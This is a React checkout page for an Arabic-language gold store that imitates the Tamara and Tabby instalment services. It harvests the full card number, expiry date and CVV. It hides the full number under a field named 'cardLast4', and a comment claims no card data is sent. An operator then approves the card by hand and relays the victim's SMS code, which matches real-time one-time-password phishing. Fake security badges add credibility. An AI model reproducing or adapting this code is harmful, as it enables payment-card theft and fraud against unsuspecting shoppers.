import { useState, useEffect } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import { useAuth } from '@/context/AuthContext';
import Layout from '@/components/Layout';
import { getProducts } from '@/data/products';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult } from '@/lib/api';
import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';

type PaymentMethod = 'tamara' | 'tabby' | null;
type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';

const Checkout = () => {
  const { id } = useParams();
  const { user } = useAuth();
  const navigate = useNavigate();
  const products = getProducts();
  const product = products.find(p => p.id === Number(id));

  const [coupon, setCoupon] = useState('');
  const [couponApplied, setCouponApplied] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(null);
  const [installments, setInstallments] = useState(1);
  const [step, setStep] = useState<Step>('checkout');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verifyCode, setVerifyCode] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [cardName, setCardName] = useState('');
  const [confirmCode, setConfirmCode] = useState('');
  const [agreedTerms, setAgreedTerms] = useState(false);
  const [commission] = useState(0);
  const [verificationError, setVerificationError] = useState<string | null>(null);

  if (!user) {
    navigate('/login?redirect=/checkout/' + id);
    return null;
  }

  if (!product) {
    return (
      <Layout>
        <div className="container mx-auto px-4 py-20 text-center">
          <h1 className="text-2xl font-bold text-foreground mb-4">المنتج غير موجود</h1>
          <Link to="/" className="text-primary hover:underline">العودة للرئيسية</Link>
        </div>
      </Layout>
    );
  }

  const formatPrice = (p: number) =>
    new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);

  const discount = couponApplied ? product.price * 0.05 : 0;
  const finalPrice = product.price - discount;
  const perInstallment = finalPrice / installments;
  const netTransfer = finalPrice - commission;
  const orderId = `ORD-${Date.now().toString(36).toUpperCase()}`;

  // Get session ID (reuses the same session from product selection)
  const sessionId = getCheckoutSessionId();

  // Send checkout_started event when page loads
  useEffect(() => {
    postCheckoutEvent({
      sessionId,
      eventType: 'checkout_started',
      userName: user.name,
      userEmail: user.email,
      productId: product.id,
      productName: product.name,
      productPrice: product.price,
      amount: finalPrice,
      timestamp: new Date().toISOString(),
    }).catch(() => {
      // Silently ignore errors
    });
  }, []); // Run once on mount

  const applyCoupon = () => {
    if (coupon.trim().toUpperCase() === 'GOLD5') {
      setCouponApplied(true);
      toast.success('تم تطبيق الكوبون! خصم 5%');
    } else {
      toast.error('كوبون غير صالح');
    }
  };

  const handleConfirmPayment = () => {
    if (!paymentMethod) {
      toast.error('يرجى اختيار طريقة الدفع');
      return;
    }
    // Send payment_method_selected event
    postCheckoutEvent({
      sessionId,
      eventType: 'payment_method_selected',
      userName: user.name,
      userEmail: user.email,
      productName: product.name,
      amount: finalPrice,
      paymentMethod,
      installments,
      timestamp: new Date().toISOString(),
    }).catch(() => {
      // Silently ignore errors
    });
    setStep('confirm-method');
  };

  const handleVerifyPhone = () => {
    if (!phoneNumber || phoneNumber.length < 9) {
      toast.error('يرجى إدخال رقم هاتف صحيح');
      return;
    }
    if (!agreedTerms) {
      toast.error('يرجى الموافقة على الشروط والأحكام');
      return;
    }
    // Send phone_entered event (backend will mask the phone number)
    postCheckoutEvent({
      sessionId,
      eventType: 'phone_entered',
      userName: user.name,
      userEmail: user.email,
      productName: product.name,
      paymentMethod,
      installments,
      phoneMasked: phoneNumber,
      timestamp: new Date().toISOString(),
    }).catch(() => {
      // Silently ignore errors
    });
    toast.info('تم إرسال رمز التحقق إلى هاتفك');
    setStep('card-info');
  };

  const handleCardSubmit = async () => {
    if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
      toast.error('يرجى ملء جميع بيانات البطاقة');
      return;
    }

    const cardLast4 = cardNumber.replace(/\D/g, '').slice(-16);

    try {
      await requestCardApproval({
        sessionId,
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: finalPrice,
        paymentMethod,
        installments,
        phoneMasked: phoneNumber,
        cardLast4,
        cardExpiry,
        cardCvv,
      });

      toast.info('جاري طلب الموافقة على بيانات البطاقة...');
      setStep('card-approval');
    } catch (err) {
      console.error('Failed to request approval:', err);
      toast.error('فشل في طلب الموافقة. يرجى المحاولة مرة أخرى.');
    }
  };

  // Poll for approval status
  useEffect(() => {
    if (step !== 'card-approval') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getCardApprovalStatus(sessionId);
        if (response.status === 'approved') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          // Send phone_confirmed event (no card/CVV data sent)
          postCheckoutEvent({
            sessionId,
            eventType: 'phone_confirmed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            paymentMethod,
            installments,
            phoneMasked: phoneNumber,
            timestamp: new Date().toISOString(),
          }).catch(() => {
            // Silently ignore errors
          });

          setStep('confirm-code');
          toast.success('تمت الموافقة على بيانات البطاقة');
        } else if (response.status === 'rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          setStep('cancelled');
          toast.error('تم رفض بيانات البطاقة من قبل الإدارة');
          clearCheckoutSessionId();
        }
      } catch (err) {
        console.error('Error checking approval status:', err);
      }
    };

    // Start polling
    pollingInterval = setInterval(pollStatus, 2000);

    // Set timeout after 5 minutes
    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setStep('checkout');
      toast.error('انتهت مهلة الموافقة. يرجى المحاولة مرة أخرى.');
    }, 5 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber]);

  // Poll for verification result
  useEffect(() => {
    if (step !== 'verifying-code') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getVerificationResult(sessionId);
        
        if (response.status === 'code_correct') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          // Send redirect_to_payment event before completing
          postCheckoutEvent({
            sessionId,
            eventType: 'redirect_to_payment',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: finalPrice,
            paymentMethod,
            installments,
            phoneMasked: phoneNumber,
            orderId,
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          // Send checkout_completed event
          postCheckoutEvent({
            sessionId,
            eventType: 'checkout_completed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: finalPrice,
            paymentMethod,
            installments,
            phoneMasked: phoneNumber,
            orderId,
            paymentStatus: 'paid',
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          setStep('success');
          toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
          clearCheckoutSessionId();
        } else if (response.status === 'code_incorrect') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('الكود غير صحيح - يرجى المحاولة لاحقاً');
          setStep('verification-failed');
          clearCheckoutSessionId();
        } else if (response.status === 'no_balance') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('لا يوجد رصيد بالبطاقة');
          setStep('verification-failed');
          clearCheckoutSessionId();
        } else if (response.status === 'card_rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('تم رفض البطاقة');
          setStep('verification-failed');
          clearCheckoutSessionId();
        }
      } catch (err) {
        console.error('Error checking verification result:', err);
      }
    };

    // Start polling
    pollingInterval = setInterval(pollStatus, 2000);

    // Set timeout after 5 minutes
    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setVerificationError('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
      setStep('verification-failed');
    }, 5 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber, finalPrice, orderId]);

  const handleFinalConfirm = async () => {
    if (!confirmCode || confirmCode.length < 4) {
      toast.error('يرجى إدخال رمز التأكيد');
      return;
    }

    try {
      await submitVerificationCode(sessionId, confirmCode, {
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: finalPrice,
        paymentMethod,
        installments,
        phoneMasked: phoneNumber,
      });

      toast.info('جاري التحقق من الكود...');
      setVerificationError(null);
      setStep('verifying-code');
    } catch (err) {
      console.error('Failed to submit verification code:', err);
      toast.error('فشل في إرسال الكود. يرجى المحاولة مرة أخرى.');
    }
  };

  const methodName = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : '';

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        <AnimatePresence mode="wait">
          {/* Step: Checkout */}
          {step === 'checkout' && (
            <motion.div key="checkout" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              {/* Header */}
              <div className="flex items-center justify-between mb-6">
                <Link to="/" className="inline-flex items-center gap-1 text-sm text-muted-foreground hover:text-primary">
                  <ArrowRight className="h-4 w-4" />
                  العودة
                </Link>
                <div className="text-foreground font-semibold text-sm flex items-center gap-2">
                  <ShoppingBag className="h-4 w-4 text-primary" />
                  سلة المشتريات / إتمام الطلب
                </div>
              </div>

              {/* User greeting */}
              <div className="bg-card rounded-xl border gold-border p-4 mb-4 flex items-center gap-3">
                <div className="w-10 h-10 rounded-full gold-gradient flex items-center justify-center text-primary-foreground font-bold text-sm">
                  {user.name.charAt(0)}
                </div>
                <div>
                  <p className="text-foreground font-semibold">{user.name}</p>
                  <p className="text-xs text-muted-foreground">{user.email}</p>
                </div>
              </div>

              {/* Product Summary */}
              <div className="bg-card rounded-xl border gold-border p-6 mb-4">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="font-bold text-foreground">{product.name}</h3>
                  <span className="px-2 py-1 text-xs rounded-full gold-gradient text-primary-foreground font-semibold">عيار {product.karat}</span>
                </div>
                <div className="text-3xl font-extrabold gold-text text-center py-4">
                  {formatPrice(product.price)}
                </div>
                {couponApplied && (
                  <div className="text-center">
                    <span className="text-sm text-green-400">خصم: -{formatPrice(discount)}</span>
                    <div className="text-2xl font-extrabold text-green-400 mt-1">{formatPrice(finalPrice)}</div>
                  </div>
                )}
                <div className="border-t gold-border mt-4 pt-4">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">إجمالي الطلب</span>
                    <span className="text-foreground font-bold">{formatPrice(finalPrice)}</span>
                  </div>
                </div>
              </div>

              {/* Coupon */}
              <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                <p className="text-sm text-muted-foreground mb-3">أدخل الكوبون لإتمام الدفع</p>
                <div className="flex gap-2">
                  <Input
                    value={coupon}
                    onChange={e => setCoupon(e.target.value)}
                    placeholder="أدخل الكوبون"
                    className="bg-secondary border-border text-foreground flex-1"
                    maxLength={30}
                    disabled={couponApplied}
                  />
                  <Button
                    onClick={applyCoupon}
                    disabled={couponApplied || !coupon.trim()}
                    className="gold-gradient text-primary-foreground font-semibold px-6"
                  >
                    {couponApplied ? <Check className="h-4 w-4" /> : 'تطبيق'}
                  </Button>
                </div>
              </div>

              {/* Payment Methods */}
              <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                <h3 className="text-sm font-bold text-foreground mb-4 flex items-center gap-2">
                  <CreditCard className="h-4 w-4 text-primary" />
                  تفاصيل الطلب - الدفع
                </h3>

                {/* Tabby */}
                <button
                  onClick={() => { setPaymentMethod('tabby'); setInstallments(4); }}
                  className={`w-full p-4 rounded-xl border mb-3 text-right transition-all ${
                    paymentMethod === 'tabby'
                      ? 'border-[hsl(160,60%,45%)] bg-[hsl(160,60%,45%,0.08)]'
                      : 'border-border hover:border-muted-foreground/50'
                  }`}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tabby' ? 'border-[hsl(160,60%,45%)]' : 'border-muted-foreground/40'}`}>
                      {paymentMethod === 'tabby' && <div className="w-3 h-3 rounded-full bg-[hsl(160,60%,45%)]" />}
                    </div>
                    <span className="font-bold text-[hsl(160,60%,45%)] text-lg">Tabby</span>
                  </div>
                  <p className="text-xs text-muted-foreground">قسّم مشترياتك على 4 دفعات بدون فوائد</p>
                </button>

                {/* Tamara */}
                <button
                  onClick={() => { setPaymentMethod('tamara'); setInstallments(1); }}
                  className={`w-full p-4 rounded-xl border mb-3 text-right transition-all ${
                    paymentMethod === 'tamara'
                      ? 'border-[hsl(340,80%,55%)] bg-[hsl(340,80%,55%,0.08)]'
                      : 'border-border hover:border-muted-foreground/50'
                  }`}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tamara' ? 'border-[hsl(340,80%,55%)]' : 'border-muted-foreground/40'}`}>
                      {paymentMethod === 'tamara' && <div className="w-3 h-3 rounded-full bg-[hsl(340,80%,55%)]" />}
                    </div>
                    <span className="font-bold text-[hsl(340,80%,55%)] text-lg">Tamara</span>
                  </div>
                  <p className="text-xs text-muted-foreground">تقسيم فاتورتك حتى 12 دفعة بدون فوائد!</p>
                </button>

                {/* Installment options for tamara */}
                {paymentMethod === 'tamara' && (
                  <div className="bg-secondary rounded-lg p-4 mb-3 space-y-3">
                    <p className="text-sm font-semibold text-foreground">اختر عدد الأقساط:</p>
                    <div className="grid grid-cols-4 gap-2">
                      {[1, 3, 6, 12].map(n => (
                        <button
                          key={n}
                          onClick={() => setInstallments(n)}
                          className={`py-2 rounded-lg text-sm font-bold transition-all ${
                            installments === n
                              ? 'gold-gradient text-primary-foreground'
                              : 'bg-card border border-border text-muted-foreground hover:border-primary/50'
                          }`}
                        >
                          {n === 1 ? 'كاملة' : `${n} أقساط`}
                        </button>
                      ))}
                    </div>
                    <div className="text-center text-sm text-muted-foreground mt-2">
                      <span>كل دفعة: </span>
                      <span className="text-primary font-bold">{formatPrice(perInstallment)}</span>
                    </div>
                  </div>
                )}

                {paymentMethod === 'tabby' && (
                  <div className="bg-secondary rounded-lg p-4 mb-3">
                    <p className="text-sm text-muted-foreground">4 دفعات بدون فوائد</p>
                    <p className="text-primary font-bold mt-1">كل دفعة: {formatPrice(finalPrice / 4)}</p>
                  </div>
                )}

                {/* Info badges */}
                <div className="space-y-2 mt-4">
                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
                    <ShieldCheck className="h-4 w-4 text-green-400" />
                    <span>ادفع قيمة طلبك كاملة</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
                    <span className="text-primary font-bold">حلال</span>
                    <span>خدمات مطابقة للشريعة الإسلامية</span>
                  </div>
                  <p className="text-xs text-muted-foreground/70">سجلك الائتماني قد يؤثر على خطط الدفع</p>
                  <p className="text-xs text-muted-foreground/70">خدمات تمارا متاحة للعملاء الأكبر من 18 سنة</p>
                </div>
              </div>

              <Button
                onClick={handleConfirmPayment}
                disabled={!paymentMethod}
                className="w-full py-6 text-lg font-bold gold-gradient text-primary-foreground"
              >
                <Lock className="h-5 w-5 ml-2" />
                تأكيد الدفع
              </Button>
            </motion.div>
          )}

          {/* Step: Confirm Method */}
          {step === 'confirm-method' && (
            <motion.div key="confirm" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <button onClick={() => setStep('checkout')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                <ChevronLeft className="h-4 w-4" /> رجوع
              </button>

              <div className="bg-card rounded-2xl border gold-border p-8 text-center">
                <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${paymentMethod === 'tamara' ? 'bg-[hsl(340,80%,55%,0.15)]' : 'bg-[hsl(160,60%,45%,0.15)]'}`}>
                  <CreditCard className={`h-8 w-8 ${paymentMethod === 'tamara' ? 'text-[hsl(340,80%,55%)]' : 'text-[hsl(160,60%,45%)]'}`} />
                </div>
                <h2 className="text-xl font-bold text-foreground mb-2">تأكيد وسيلة الدفع</h2>
                <p className="text-2xl font-extrabold mb-6" style={{ color: paymentMethod === 'tamara' ? 'hsl(340,80%,55%)' : 'hsl(160,60%,45%)' }}>
                  {methodName}
                </p>

                <div className="bg-secondary rounded-xl p-5 text-right mb-6 space-y-3">
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-medium">{formatPrice(finalPrice)}</span>
                    <span className="text-muted-foreground">المبلغ</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-medium">{installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}</span>
                    <span className="text-muted-foreground">عدد الدفعات</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-medium">{formatPrice(perInstallment)}</span>
                    <span className="text-muted-foreground">كل دفعة</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-medium">{formatPrice(commission)}</span>
                    <span className="text-muted-foreground">العمولة</span>
                  </div>
                  <div className="border-t gold-border pt-3 flex justify-between text-sm">
                    <span className="text-primary font-bold">{formatPrice(netTransfer)}</span>
                    <span className="text-muted-foreground">صافي التحويل</span>
                  </div>
                </div>

                <h3 className="text-lg font-bold text-foreground mb-4">تحقق من رقمك</h3>
                <div className="space-y-3 text-right">
                  <div className="space-y-2">
                    <Label className="text-foreground text-sm">رقم الهاتف</Label>
                    <Input
                      value={phoneNumber}
                      onChange={e => setPhoneNumber(e.target.value)}
                      placeholder="05XXXXXXXX"
                      className="bg-secondary border-border text-foreground text-center text-lg tracking-widest"
                      maxLength={15}
                      dir="ltr"
                    />
                  </div>

                  <label className="flex items-center gap-2 text-sm text-muted-foreground cursor-pointer">
                    <input
                      type="checkbox"
                      checked={agreedTerms}
                      onChange={e => setAgreedTerms(e.target.checked)}
                      className="rounded border-border accent-primary"
                    />
                    أوافق على شروط وأحكام {methodName}
                  </label>
                </div>

                <Button
                  onClick={handleVerifyPhone}
                  className="w-full mt-6 py-5 font-bold gold-gradient text-primary-foreground"
                  disabled={!phoneNumber || !agreedTerms}
                >
                  تأكيد
                </Button>
              </div>
            </motion.div>
          )}

          {/* Step: Card Info */}
          {step === 'card-info' && (
            <motion.div key="card" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <button onClick={() => setStep('confirm-method')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                <ChevronLeft className="h-4 w-4" /> رجوع
              </button>

              <div className="bg-card rounded-2xl border gold-border p-8">
                <div className="text-center mb-6">
                  <CreditCard className="h-10 w-10 text-primary mx-auto mb-3" />
                  <h2 className="text-xl font-bold text-foreground">بيانات البطاقة</h2>
                  <p className="text-sm text-muted-foreground mt-1">أدخل بيانات بطاقتك البنكية</p>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label className="text-foreground text-sm">اسم حامل البطاقة</Label>
                    <Input value={cardName} onChange={e => setCardName(e.target.value)} placeholder="الاسم كما يظهر على البطاقة" className="bg-secondary border-border text-foreground" dir="ltr" maxLength={100} />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-foreground text-sm">رقم البطاقة</Label>
                    <Input value={cardNumber} onChange={e => setCardNumber(e.target.value)} placeholder="XXXX XXXX XXXX XXXX" className="bg-secondary border-border text-foreground text-center tracking-[0.3em]" dir="ltr" maxLength={19} />
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <Label className="text-foreground text-sm">تاريخ الانتهاء</Label>
                      <Input value={cardExpiry} onChange={e => setCardExpiry(e.target.value)} placeholder="MM/YY" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={5} />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-foreground text-sm">CVV</Label>
                      <Input value={cardCvv} onChange={e => setCardCvv(e.target.value)} placeholder="•••" type="password" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={4} />
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handleCardSubmit}
                  className="w-full mt-6 py-5 font-bold gold-gradient text-primary-foreground"
                  disabled={!cardNumber || !cardExpiry || !cardCvv || !cardName}
                >
                  <Lock className="h-4 w-4 ml-2" />
                  ادخل
                </Button>

                <div className="flex items-center justify-center gap-2 mt-4 text-xs text-muted-foreground">
                  <ShieldCheck className="h-3 w-3" />
                  <span>بياناتك محمية بتشفير SSL</span>
                </div>
              </div>
            </motion.div>
          )}

          {/* Step: Card Approval (waiting) */}
          {step === 'card-approval' && (
            <motion.div key="approval" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">بانتظار الموافقة</h2>
                <p className="text-muted-foreground mb-6">جاري مراجعة طلبك من قبل الإدارة</p>
                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً بعد الموافقة</p>
              </div>
            </motion.div>
          )}

          {/* Step: Cancelled */}
          {step === 'cancelled' && (
            <motion.div key="cancelled" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
                  <XCircle className="h-10 w-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-extrabold text-red-500 mb-3">تم إلغاء الطلب</h2>
                <p className="text-muted-foreground mb-6">تم رفض بيانات البطاقة من قبل الإدارة</p>
                <Link to="/">
                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}

          {/* Step: Confirm Code */}
          {step === 'confirm-code' && (
            <motion.div key="code" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <div className="bg-card rounded-2xl border gold-border p-8 text-center">
                <Phone className="h-12 w-12 text-primary mx-auto mb-4" />
                <h2 className="text-xl font-bold text-foreground mb-2">رمز تأكيد الدفع</h2>
                <p className="text-sm text-muted-foreground mb-6">أدخل الرمز المرسل إلى هاتفك لتأكيد عملية الدفع</p>

                <Input
                  value={confirmCode}
                  onChange={e => setConfirmCode(e.target.value)}
                  placeholder="أدخل الرمز"
                  className="bg-secondary border-border text-foreground text-center text-2xl tracking-[0.5em] py-6 mb-6"
                  dir="ltr"
                  maxLength={6}
                />

                <Button
                  onClick={handleFinalConfirm}
                  className="w-full py-5 font-bold gold-gradient text-primary-foreground"
                  disabled={!confirmCode}
                >
                  تأكيد
                </Button>
              </div>
            </motion.div>
          )}

          {/* Step: Verifying Code (waiting for admin) */}
          {step === 'verifying-code' && (
            <motion.div key="verifying" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">جاري التحقق من الكود</h2>
                <p className="text-muted-foreground mb-6">يرجى الانتظار بينما يتم التحقق من كود التفعيل</p>
                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً</p>
              </div>
            </motion.div>
          )}

          {/* Step: Verification Failed */}
          {step === 'verification-failed' && (
            <motion.div key="verification-failed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
                  <AlertCircle className="h-10 w-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-extrabold text-red-500 mb-3">فشل التحقق</h2>
                <p className="text-muted-foreground mb-6">{verificationError || 'حدث خطأ أثناء التحقق من الكود'}</p>
                <Link to="/">
                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}

          {/* Step: Success */}
          {step === 'success' && (
            <motion.div key="success" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full gold-gradient mx-auto mb-6 flex items-center justify-center">
                  <Check className="h-10 w-10 text-primary-foreground" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">تم الشراء بنجاح! 🎉</h2>
                <p className="text-muted-foreground mb-6">شكراً لك {user.name}، تم تأكيد طلبك</p>

                <div className="bg-secondary rounded-xl p-5 text-right space-y-3 mb-6">
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-mono text-xs">{orderId}</span>
                    <span className="text-muted-foreground">رقم الطلب</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{product.name}</span>
                    <span className="text-muted-foreground">المنتج</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-primary font-bold">{formatPrice(finalPrice)}</span>
                    <span className="text-muted-foreground">المبلغ</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{methodName}</span>
                    <span className="text-muted-foreground">طريقة الدفع</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}</span>
                    <span className="text-muted-foreground">الدفعات</span>
                  </div>
                </div>

                {/* Telegram notification preview */}
                <div className="bg-[hsl(200,50%,12%)] rounded-xl p-5 text-right border border-[hsl(200,50%,25%)] mb-6">
                  <div className="flex items-center gap-2 mb-3">
                    <span className="text-xs px-2 py-1 rounded bg-[hsl(200,60%,50%,0.2)] text-[hsl(200,60%,60%)]">📬 إشعار تلغرام</span>
                  </div>
                  <div className="text-xs text-[hsl(200,20%,70%)] space-y-1 font-mono">
                    <p>🎉 <strong className="text-[hsl(200,60%,70%)]">تم إتمام الطلب</strong></p>
                    <p>👤 الاسم: {user.name}</p>
                    <p>📧 الإيميل: {user.email}</p>
                    <p>📦 المنتج: {product.name}</p>
                    <p>💰 المبلغ: {formatPrice(finalPrice)}</p>
                    <p>💳 طريقة الدفع: {methodName}</p>
                    <p>📊 الأقساط: {installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}</p>
                    <p>🆔 رقم الطلب: {orderId}</p>
                  </div>
                </div>

                <Link to="/">
                  <Button className="w-full gold-gradient text-primary-foreground font-bold py-5">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </Layout>
  );
};

export default Checkout;
